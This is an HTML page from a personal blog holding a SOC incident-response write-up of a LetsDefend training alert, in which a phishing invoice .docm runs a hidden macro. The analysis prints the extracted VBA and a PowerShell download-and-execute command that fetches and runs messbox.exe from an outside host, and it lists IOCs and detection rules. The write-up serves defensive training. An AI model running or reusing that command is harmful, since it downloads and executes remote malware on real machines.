@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Alert Name: SOC205 – Malicious Macro has been executed
+Severity: High
+Event ID: 231
+Event Time: Feb 28, 2024 – 08:42 AM
+Category: Malware
+Platform: LetsDefend SOC
+Executive Summary (Management / Business) On February 28, 2024, a user received a malicious email that appeared to contain a legitimate invoice document. When the user opened the attachment, hidden malicious code inside the document was automatically executed.
+This hidden code attempted to connect to an external system controlled by an attacker and download additional harmful software." />
+<meta name="keywords" content=", soc, letsdefend, malware, phishing, macros, powershell, incident-response" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/letsdefend/alerts/soc205---malicious-macro-has-been-executed/" />
+
+
+    <title>
+        
+            SOC205 Case Study: Malicious Macro Execution via Phishing Invoice :: Hello w3nch 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.ebe3824dfa5345ef854f8b255c278f701966e9be3892354b588fb1650ecd358e.css" integrity="sha256-6&#43;OCTfpTRe&#43;FT4slXCePcBlm6b44kjVLWI&#43;xZQ7NNY4=" crossorigin="anonymous">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="css/code.css">
+    
+
+    
+        <link rel="stylesheet" type="text/css" href="css/writeups.css">
+    
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="SOC205 Case Study: Malicious Macro Execution via Phishing Invoice">
+<meta itemprop="description" content="Alert Name: SOC205 – Malicious Macro has been executed
+Severity: High
+Event ID: 231
+Event Time: Feb 28, 2024 – 08:42 AM
+Category: Malware
+Platform: LetsDefend SOC
+Executive Summary (Management / Business) On February 28, 2024, a user received a malicious email that appeared to contain a legitimate invoice document. When the user opened the attachment, hidden malicious code inside the document was automatically executed.
+This hidden code attempted to connect to an external system controlled by an attacker and download additional harmful software."><meta itemprop="datePublished" content="2026-01-19T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2026-01-19T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1353">
+<meta itemprop="keywords" content="soc,letsdefend,malware,phishing,macros,powershell,incident-response," />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SOC205 Case Study: Malicious Macro Execution via Phishing Invoice"/>
+<meta name="twitter:description" content="Alert Name: SOC205 – Malicious Macro has been executed
+Severity: High
+Event ID: 231
+Event Time: Feb 28, 2024 – 08:42 AM
+Category: Malware
+Platform: LetsDefend SOC
+Executive Summary (Management / Business) On February 28, 2024, a user received a malicious email that appeared to contain a legitimate invoice document. When the user opened the attachment, hidden malicious code inside the document was automatically executed.
+This hidden code attempted to connect to an external system controlled by an attacker and download additional harmful software."/>
+
+
+
+
+
+    <meta property="article:section" content="SOC Analysis" />
+
+    <meta property="article:section" content="Malware Investigation" />
+
+
+
+    <meta property="article:published_time" content="2026-01-19 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                hello ;)</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner">
+                <li><a href="/about/">About</a></li>
+            
+                <li><a href="/posts/">Blog</a></li>
+            
+                <li><a href="/contact/">Contact</a></li>
+            
+                <li><a href="/resume.pdf">Resume</a></li>
+            
+                <li><a href="/writeups/">Writeup</a></li>
+            
+    </ul>
+</nav>
+
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            
+    <div class="content">
+        <main class="post">
+
+            <div class="post-info">
+                
+                </p>
+            </div>
+
+            <article>
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/letsdefend/alerts/soc205---malicious-macro-has-been-executed/">SOC205 Case Study: Malicious Macro Execution via Phishing Invoice</a></h2>
+
+                
+                
+                
+
+                <div class="post-content">
+                    <p><strong>Alert Name:</strong> SOC205 – Malicious Macro has been executed<br>
+<strong>Severity:</strong> High<br>
+<strong>Event ID:</strong> 231<br>
+<strong>Event Time:</strong> Feb 28, 2024 – 08:42 AM<br>
+<strong>Category:</strong> Malware<br>
+<strong>Platform:</strong> LetsDefend SOC</p>
+<h2 id="executive-summary-management--business">Executive Summary (Management / Business)</h2>
+<p>On February 28, 2024, a user received a malicious email that appeared to contain a legitimate invoice document. When the user opened the attachment, hidden malicious code inside the document was automatically executed.</p>
+<p>This hidden code attempted to connect to an external system controlled by an attacker and download additional harmful software. Security monitoring systems detected this activity shortly after it occurred.</p>
+<p>Although the malicious file was detected, it was not automatically blocked, which increased the risk to the affected system. As a precaution, the impacted computer was immediately isolated from the network, and all known malicious connections were blocked to prevent further damage.</p>
+<p>There is no confirmed evidence of data loss at this time; however, the incident is considered high risk due to the nature of the attack. Additional security controls and user awareness measures are recommended to reduce the likelihood of similar attacks in the future.</p>
+<h2 id="technical-summary-technical">Technical Summary (Technical)</h2>
+<p>On February 28, 2024, a high-severity security alert (SOC205) was triggered after a user on host <strong>Jayne (172.16.17.198)</strong> executed a malicious macro-enabled Microsoft Word document (<code>edit1-invoice.docm</code>). The file was delivered via a phishing email and contained embedded VBA macros that executed automatically when the document was opened.</p>
+<p>The macro launched a PowerShell command in a hidden window, which attempted to download an external executable (<code>messbox.exe</code>) from a remote server. Network and endpoint logs confirmed DNS resolution and outbound connection attempts to a known malicious IP address (<strong>92.204.221.16</strong>), indicating command-and-control (C2) communication activity.</p>
+<p>The file hash was validated using VirusTotal and Hybrid Analysis, where it was classified as malicious by multiple engines. The document was not quarantined, and macro execution was allowed on the system, increasing the risk of compromise. Immediate response actions included isolating the affected host, removing the phishing email, blocking identified indicators of compromise (IOCs), and preserving forensic artifacts.</p>
+<p>This incident was confirmed as a <strong>True Positive</strong> and represents a successful macro-based malware execution attempt via phishing.</p>
+<hr>
+<h2 id="1-alert-overview">1. Alert Overview</h2>
+<p>A high-severity malware alert was triggered after a <strong>macro-enabled Microsoft Word document (.docm)</strong> was executed on the host <strong>Jayne</strong>. Macro-enabled Office documents are frequently abused in phishing campaigns to deliver malware through embedded VBA code that launches PowerShell or command-line payloads.</p>
+<p>In this incident, the document successfully executed a malicious macro, resulting in outbound communication attempts to a known malicious command-and-control (C2) infrastructure.</p>
+<h3 id="2-key-event-details">2. Key Event Details</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Hostname</td>
+<td>Jayne</td>
+</tr>
+<tr>
+<td>Source IP</td>
+<td>172.16.17.198</td>
+</tr>
+<tr>
+<td>File Name</td>
+<td>edit1-invoice.docm</td>
+</tr>
+<tr>
+<td>File Path</td>
+<td>C:\Users\LetsDefend\Downloads\edit1-invoice.docm</td>
+</tr>
+<tr>
+<td>File Hash (SHA-256)</td>
+<td>1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0</td>
+</tr>
+<tr>
+<td>Trigger Reason</td>
+<td>Suspicious file detected on system</td>
+</tr>
+<tr>
+<td>AV/EDR Action</td>
+<td>Detected</td>
+</tr>
+<tr>
+<td>Quarantined</td>
+<td>No</td>
+</tr>
+</tbody>
+</table>
+<h2 id="3-threat-indicators-identified">3. Threat Indicators Identified</h2>
+<ul>
+<li>Macro-enabled Word document (.docm)</li>
+<li>Obfuscated VBA macro execution</li>
+<li>PowerShell execution triggered by macro</li>
+<li>DNS lookup and outbound traffic to known malicious IP</li>
+<li>Download-and-execute behavior</li>
+</ul>
+<h2 id="4-malware-quarantine-status">4. Malware Quarantine Status</h2>
+<ul>
+<li>The malicious document <strong>was not quarantined</strong></li>
+<li>Macro execution was <strong>successful</strong></li>
+<li>Manual investigation and containment were required</li>
+</ul>
+<h2 id="5-malware-analysis-tools-used">5. Malware Analysis Tools Used</h2>
+<p>The file hash was analyzed using multiple third-party platforms:</p>
+<ul>
+<li><a href="https://www.virustotal.com/gui/file/1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0">VirusTotal</a></li>
+</ul>
+<p><img src="https://i.ibb.co/vvrZZhqY/Pasted-image-20260127180540.png" alt=""></p>
+<ul>
+<li><a href="https://hybrid-analysis.com/search?query=1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0">Hybrid Analysis</a>
+<img src="https://i.ibb.co/nNmDC5Vf/Pasted-image-20260127180647.png" alt=""></li>
+</ul>
+<p><img src="https://i.ibb.co/ymgwNSQj/Pasted-image-20260127180944.png" alt=""></p>
+<h3 id="analysis-results">Analysis Results</h3>
+<ul>
+<li>Multiple security engines flagged the document as <strong>malicious</strong></li>
+<li>Classified as <strong>Trojan / Macro-based malware</strong></li>
+<li>Embedded VBA macro detected in <code>ThisDocument.cls</code></li>
+<li>Macro triggered PowerShell execution silently</li>
+</ul>
+<p>This confirms the document was intentionally crafted for malicious execution.</p>
+<h2 id="6-command-and-control-c2-communication-check">6. Command-and-Control (C2) Communication Check</h2>
+<p>During log analysis, outbound activity related to the malicious macro was observed.
+<img src="https://i.ibb.co/TBJFbFMZ/Pasted-image-20260127220435.png" alt=""></p>
+<p><img src="https://i.ibb.co/9HKyrs2D/Pasted-image-20260127220833.png" alt=""></p>
+<p><strong>C2 IP Address Identified:</strong></p>
+<ul>
+<li><code>92.204.221.16</code></li>
+<li><a href="https://urlscan.io/result/019bff81-53bd-77ce-9ffc-a2200a0d75b3/">URLScan</a></li>
+</ul>
+<p><img src="https://i.ibb.co/cStPfNsc/Pasted-image-20260127221321.png" alt=""></p>
+<h3 id="observed-behavior">Observed Behavior</h3>
+<ul>
+<li>PowerShell initiated a DNS lookup for the C2 host</li>
+<li>Outbound HTTP requests were observed</li>
+<li>Proxy and firewall logs confirmed attempted communication</li>
+</ul>
+<p><strong>C2 Status:</strong> Accessed</p>
+<p>This indicates the macro successfully reached out to external infrastructure.</p>
+<h2 id="7-initial-access-vector--phishing">7. Initial Access Vector – Phishing</h2>
+<p>Further investigation focused on how the file reached the host.
+<img src="https://i.ibb.co/NgvKrKvN/Pasted-image-20260127222412.png" alt=""></p>
+<h3 id="findings">Findings</h3>
+<ul>
+<li>A phishing email was received at <strong>08:12 AM</strong></li>
+<li>Sender: <code>jake.admin[@]cybercommunity[.]info</code></li>
+<li>The email contained a ZIP attachment</li>
+<li>At <strong>08:41 AM</strong>, the ZIP was extracted into the Downloads folder</li>
+<li>At <strong>08:42 AM</strong>, the document was opened and the macro executed</li>
+</ul>
+<p>This confirms <strong>phishing</strong> as the initial access vector.</p>
+<h3 id="8-malware-execution-timeline">8. Malware Execution Timeline</h3>
+<p><img src="https://i.ibb.co/wNnfVbqM/Pasted-image-20260127220503.png" alt=""></p>
+<table>
+<thead>
+<tr>
+<th>Time</th>
+<th>Activity</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>08:12 AM</td>
+<td>Phishing email delivered</td>
+</tr>
+<tr>
+<td>08:41 AM</td>
+<td>Malicious ZIP extracted</td>
+</tr>
+<tr>
+<td>08:42 AM</td>
+<td>DOCM opened</td>
+</tr>
+<tr>
+<td>08:42 AM</td>
+<td>Macro executes PowerShell</td>
+</tr>
+<tr>
+<td>08:42 AM</td>
+<td>DNS lookup to C2</td>
+</tr>
+<tr>
+<td>08:42 AM</td>
+<td>Script block execution logged</td>
+</tr>
+<tr>
+<td>![[Pasted image 20260127220503.png]]</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="9-static-malware-analysis">9. Static Malware Analysis</h2>
+<p>Static analysis was performed in an isolated environment.</p>
+<h3 id="tools-used">Tools Used</h3>
+<ul>
+<li>oleid</li>
+<li>olevba</li>
+<li>exiftool</li>
+</ul>
+<h3 id="results">Results</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>File Name                       : edit1-invoice.docm
+</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">24</span> kB
+</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
+</span></span><span style="display:flex;"><span>File Type                       : DOCM
+</span></span><span style="display:flex;"><span>File Type Extension             : docm
+</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.ms-word.document.macroEnabled.12
+</span></span><span style="display:flex;"><span>Zip Required Version            : <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
+</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
+</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
+</span></span><span style="display:flex;"><span>Zip CRC                         : 0x4c8f57fb
+</span></span><span style="display:flex;"><span>Zip Compressed Size             : <span style="color:#ae81ff">505</span>
+</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : <span style="color:#ae81ff">1945</span>
+</span></span><span style="display:flex;"><span>Zip File Name                   : <span style="color:#f92672">[</span>Content_Types<span style="color:#f92672">]</span>.xml
+</span></span><span style="display:flex;"><span>Template                        : Normal.dotm
+</span></span><span style="display:flex;"><span>Total Edit Time                 : <span style="color:#ae81ff">4</span> minutes
+</span></span><span style="display:flex;"><span>Pages                           : <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Words                           : <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Characters                      : <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>Application                     : Microsoft Office Word
+</span></span><span style="display:flex;"><span>Links Up To Date                : No
+</span></span><span style="display:flex;"><span>Characters With Spaces          : <span style="color:#ae81ff">29</span>
+</span></span><span style="display:flex;"><span>Shared Doc                      : No
+</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
+</span></span><span style="display:flex;"><span>App Version                     : 12.0000
+</span></span><span style="display:flex;"><span>Creator                         : user1
+</span></span><span style="display:flex;"><span>Last Modified By                : Microsoft
+</span></span><span style="display:flex;"><span>Revision Number                 : <span style="color:#ae81ff">5</span>
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>Indicator</th>
+<th>Value</th>
+<th>Risk</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>File Format</td>
+<td>MS Word 2007+ Macro-Enabled Document (.docm)</td>
+<td>Info</td>
+<td>Macro-enabled Word document format</td>
+</tr>
+<tr>
+<td>Container Format</td>
+<td>OpenXML</td>
+<td>Info</td>
+<td>Standard Microsoft Office Open XML container</td>
+</tr>
+<tr>
+<td>Encrypted</td>
+<td>False</td>
+<td>None</td>
+<td>The file is not encrypted</td>
+</tr>
+<tr>
+<td>VBA Macros</td>
+<td>Yes, suspicious</td>
+<td><strong>High</strong></td>
+<td>The file contains VBA macros with suspicious keywords. Further analysis recommended using <strong>olevba</strong> and <strong>mraptor</strong></td>
+</tr>
+<tr>
+<td>XLM Macros</td>
+<td>No</td>
+<td>None</td>
+<td>The file does not contain Excel 4.0 (XLM) macros</td>
+</tr>
+<tr>
+<td>External Relationships</td>
+<td>0</td>
+<td>None</td>
+<td>No remote templates, external OLE objects, or external references detected</td>
+</tr>
+</tbody>
+</table>
+<h4 id="macro-execution-flow-simplified">Macro Execution Flow (Simplified)</h4>
+<ol>
+<li>User opens the Word document</li>
+<li>ActiveX control (<code>InkEdit1</code>) gains focus</li>
+<li><code>InkEdit1_GotFocus()</code> macro executes</li>
+<li>Macro reads a command from <code>UserForm1.TextBox1</code></li>
+<li><code>cmd.exe</code> launches PowerShell silently</li>
+<li>PowerShell downloads <code>messbox.exe</code></li>
+<li>File is saved locally as <code>mess.exe</code></li>
+<li>Downloaded executable is executed
+<strong>Extracted Malicious VBA Code:</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-vb" data-lang="vb"><span style="display:flex;"><span><span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">InkEdit1_GotFocus</span>()
+</span></span><span style="display:flex;"><span>    Run <span style="color:#f92672">=</span> Shell(UserForm1.TextBox1, 0)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
+</span></span></code></pre></div><ul>
+<li><code>Shell(..., 0)</code> → Executes the command <strong>with a hidden window</strong></li>
+<li>Command content is stored externally in a form object (evasion)
+<strong>Embedded Command Extracted from UserForm:</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-vb" data-lang="vb"><span style="display:flex;"><span>cmd.exe <span style="color:#f92672">/</span>c PowerShell (<span style="color:#66d9ef">New</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Object</span> System.Net.WebClient).DownloadFile(
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&#39;http://www.greyhathacker.net/tools/messbox.exe&#39;,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&#39;mess.exe&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>)<span style="color:#960050;background-color:#1e0010">;</span> Start<span style="color:#f92672">-</span>Process <span style="color:#75715e">&#39;mess.exe&#39;
+</span></span></span></code></pre></div><h4 id="behavior-breakdown">Behavior Breakdown</h4>
+<ul>
+<li>
+<p>Uses <code>cmd.exe</code> as an execution wrapper</p>
+</li>
+<li>
+<p>Launches PowerShell</p>
+</li>
+<li>
+<p>Downloads a remote payload</p>
+</li>
+<li>
+<p>Executes the payload immediately</p>
+</li>
+<li>
+<p>Macro presence confirmed</p>
+</li>
+<li>
+<p>VBA code executed shell commands</p>
+</li>
+<li>
+<p>Obfuscation present but not heavily layered</p>
+</li>
+<li>
+<p>PowerShell used as second-stage loader</p>
+</li>
+</ul>
+<p>The macro logic retrieves and executes a command stored within a form control, launching it with a hidden window style.</p>
+<h2 id="10-powershell-payload-behavior">10. PowerShell Payload Behavior</h2>
+<p><img src="https://i.ibb.co/2Y1QZLpB/Pasted-image-20260127220527.png" alt="">
+The PowerShell command attempted to download a remote executable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>(New-Object System.Net.WebClient).DownloadFile(
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;hxxp://www.greyhathacker.net/tools/messbox.exe&#39;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;mess.exe&#39;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>Start-Process <span style="color:#e6db74">&#39;mess.exe&#39;</span>
+</span></span></code></pre></div><h3 id="observations">Observations</h3>
+<ul>
+<li>Download attempted from external web server</li>
+<li>HTTP response returned <strong>404</strong>, but DNS and connection attempts were logged</li>
+<li>Firewall logs showed traffic to <strong>92.204.221.16</strong></li>
+</ul>
+<p>This confirms <strong>attempted ingress tool transfer</strong>.</p>
+<h2 id="11-impact-assessment">11. Impact Assessment</h2>
+<ul>
+<li>Malware Execution: <strong>Yes</strong></li>
+<li>System Compromise: <strong>Likely</strong></li>
+<li>Persistence Mechanisms: <strong>Possible</strong></li>
+<li>Data Exposure: <strong>Unknown</strong></li>
+<li>Business Impact: <strong>High Risk</strong></li>
+</ul>
+<h2 id="12-containment--response-actions">12. Containment &amp; Response Actions</h2>
+<p><img src="https://i.ibb.co/8DndGxvy/Pasted-image-20260127220655.png" alt=""></p>
+<ul>
+<li>Isolated host <strong>Jayne</strong></li>
+<li>Preserved forensic artifacts</li>
+<li>Blocked malicious IP and URL</li>
+<li>Removed phishing email</li>
+<li>Logged and defanged IOCs</li>
+<li>Closed alert as confirmed incident</li>
+</ul>
+<h2 id="13-mitre-attck-mapping">13. MITRE ATT&amp;CK Mapping</h2>
+<table>
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique</th>
+<th>Technique ID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Initial Access</td>
+<td>Phishing</td>
+<td><strong>T1566</strong></td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>Command and Scripting Interpreter (PowerShell)</td>
+<td><strong>T1059.001</strong></td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>User Execution – Malicious File</td>
+<td><strong>T1204.002</strong></td>
+</tr>
+<tr>
+<td>Command &amp; Control</td>
+<td>Application Layer Protocol</td>
+<td><strong>T1071</strong></td>
+</tr>
+<tr>
+<td>Command &amp; Control</td>
+<td>Ingress Tool Transfer</td>
+<td><strong>T1105</strong></td>
+</tr>
+</tbody>
+</table>
+<h2 id="14-artifacts-collected">14. Artifacts Collected</h2>
+<table>
+<thead>
+<tr>
+<th>Artifact</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Attacker IP</td>
+<td>92.204.221.16</td>
+</tr>
+<tr>
+<td>Sender Email</td>
+<td>jake.admin[@]cybercommunity[.]info</td>
+</tr>
+<tr>
+<td>Victim User</td>
+<td>jayne[@]letsdefend[.]io</td>
+</tr>
+<tr>
+<td>File</td>
+<td>edit1-invoice.docm</td>
+</tr>
+<tr>
+<td>Hash</td>
+<td>1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0</td>
+</tr>
+<tr>
+<td>Dropped EXE</td>
+<td>mess.exe / messbox.exe</td>
+</tr>
+</tbody>
+</table>
+<h2 id="15-sigma-rules">15. Sigma Rules</h2>
+<ul>
+<li><a href="https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC205%20-%20Malicious%20Macro%20has%20been%20executed/office_macro_spawning_powershell.yml">Office Macro Spawning PowerShell</a></li>
+<li><a href="https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC205%20-%20Malicious%20Macro%20has%20been%20executed/office_macro_spawning_powershell.yml">PowerShell DownloadFile</a></li>
+<li><a href="https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC205%20-%20Malicious%20Macro%20has%20been%20executed/office_macro_hidden_shell_execution.yml">Office Macro Hidden Execution (Shell with Hidden Window)</a></li>
+<li><a href="https://github.com/w3nch/Sigma-rules/blob/main/LetsDefend/SOC205%20-%20Malicious%20Macro%20has%20been%20executed/powershell_downloadfile_mess_exe.yml">Office Dropping Executables (mess.exe pattern)</a></li>
+</ul>
+<h2 id="final-verdict">Final Verdict</h2>
+<p><strong>True Positive – Confirmed Malicious Macro Execution</strong></p>
+<p>The macro-enabled Word document successfully executed malicious VBA code that launched PowerShell, attempted to download a remote payload, and communicated with external infrastructure. This incident represents a confirmed malware infection and required immediate containment.</p>
+<h2 id="analyst-note">Analyst Note</h2>
+<p>This case demonstrates a classic phishing-based macro attack chain. Despite modern Office security controls, macro execution was permitted on the system, allowing the attacker to execute PowerShell silently. Strengthening macro policies, improving email filtering, and user awareness training are critical to preventing similar incidents.</p>
+<p><img src="https://i.ibb.co/mCm9jcF3/Pasted-image-20260128172817.png" alt=""></p>
+
+                </div>
+            </article>
+
+            <hr />
+
+            <div class="post-info">
+                
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://localhost:1313/tags/soc/">soc</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/letsdefend/">letsdefend</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/malware/">malware</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/phishing/">phishing</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/macros/">macros</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/powershell/">powershell</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/incident-response/">incident-response</a></span>
+        
+    </p>
+
+                
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="http://localhost:1313/categories/soc-analysis/">SOC Analysis</a></span>
+        <span class="tag"><a href="http://localhost:1313/categories/malware-investigation/">Malware Investigation</a></span>
+        
+    </p>
+
+            </div>
+        </main>
+    </div>
+
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            
+            <span><a href="http://localhost:1313/"></a></span>
+            <span></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by Hugo</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.19d7885e5a4b0e5e2cd7238fc80b8b19888099cb78c032aedeb0b3b0010b8bb3dfb34849cf40a9e83f55f266aa32354528c10a24f2a42e6e8e21e813a26d9647.js" integrity="sha512-GdeIXlpLDl4s1yOPyAuLGYiAmct4wDKu3rCzsAELi7Pfs0hJz0Cp6D9V8maqMjVFKMEKJPKkLm6OIegTom2WRw=="></script>
+
+
+
+
+    </body>
+</html>
